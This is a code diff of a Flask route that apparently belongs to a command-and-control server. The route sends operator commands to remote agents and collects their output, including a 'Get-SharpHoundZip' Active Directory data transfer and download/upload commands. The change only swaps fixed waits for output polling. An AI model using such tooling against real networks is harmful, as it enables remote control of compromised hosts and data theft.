@@ -190,31 +190,45 @@ def executecmd(agentname):
 @app.route("/<agentname>/execute",methods=['GET','POST'])
 def execute(agentname):
     if request.method=='GET':
+        counter = 0
         cmd = request.args.get('d')
         # Get-SharpHoundZip
         #print(cmd)
         for i in THREADS:
             if agentname in i.name:
                 req_index = THREADS.index(i)
+        prev = CMD_OUTPUT[req_index]
         CMD_INPUT[req_index]=cmd
         if cmd=="Get-SharpHoundZip":
             CMD_OUTPUT[req_index]="Trying to initiate transfer... If you get incorrect or less data, run it again"
             time.sleep(3)
             cmdoutput = CMD_OUTPUT[req_index]
             return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
-        time.sleep(5)
+        #time.sleep(5)
         cmdoutput = CMD_OUTPUT[req_index]
+        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
+            time.sleep(0.5)
+            counter+=1
+        if counter>1:
+            cmdoutput = CMD_OUTPUT[req_index]
         return render_template("execute.html",name=agentname,cmdoutput=cmdoutput)
     if request.method=='POST':
         cmd = request.form['command']
+        counter = 0
         for i in THREADS:
             if agentname in i.name:
                 req_index = THREADS.index(i)
+        prev = CMD_OUTPUT[req_index]
         CMD_INPUT[req_index]=cmd
         if CMD_INPUT[req_index].split(" ")[0] in ["download","upload"]:
             time.sleep(6)
         time.sleep(1)
         cmdoutput = CMD_OUTPUT[req_index]
+        while (prev==CMD_OUTPUT[req_index] and counter<6) or prev=="Hello World":
+            time.sleep(0.5)
+            counter+=1
+        if counter>0:
+            cmdoutput = CMD_OUTPUT[req_index]
         return render_template('execute.html',cmdoutput=cmdoutput,name=agentname,ips=IPS)
 
 
